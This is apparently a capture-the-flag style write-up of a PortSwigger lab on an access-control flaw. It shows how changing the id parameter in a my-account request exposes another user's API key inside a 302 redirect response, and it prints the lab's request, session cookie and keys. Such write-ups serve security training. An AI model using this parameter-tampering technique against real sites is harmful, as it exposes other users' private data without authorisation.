## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/a8ae98c6-d63e-440b-b2b7-2752efb06f50)


## Solution :

In some cases, an application does detect when the **user is not permitted to access the resource**, and **returns a redirect to the login page**. However, the r**esponse containing the redirect might still include some sensitive data belonging to the targeted user**, so the attack is still successful.

Clicking on `My Account` takes us to the login page where we can login as wiener useing the credentials `wiener:peter`.

We get the account page which displays wiener's API key - `TrXg5Plale9m8ZeZkBdoOcoUxMLx0A6Z`

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/29ece96d-ee68-4033-9234-892ec63e13fa)

When we click on `My account` again, the browser sends a request which contains `?id=wiener`

```http
GET /my-account?id=wiener HTTP/2
Host: 0a5000690443c96d817ea23f00f10041.web-security-academy.net
Cookie: session=Ues4LJi6ijUdDxBu151S7lxWUznAJ8SH
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a5000690443c96d817ea23f00f10041.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```

Send the request to repeater tab. Change the value to `?id=carlos` and observe the response.

We get a `302 Redirect` response back .

```http
HTTP/2 302 Found
Location: /login
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3395
```

Here the **API key of Carlos is leaked in the redirect response**.\

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/90a20837-28c2-41ea-8431-cf8b017e0504)

API key of wiener - `TrXg5Plale9m8ZeZkBdoOcoUxMLx0A6Z`
API key of carlos - `NF0f1VagtP0XYSz7Gk62NmWSj3ZOcAHE`

Submit the key and the lab is solved.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/57200fd6-219e-4763-a3a4-6305753838e1)








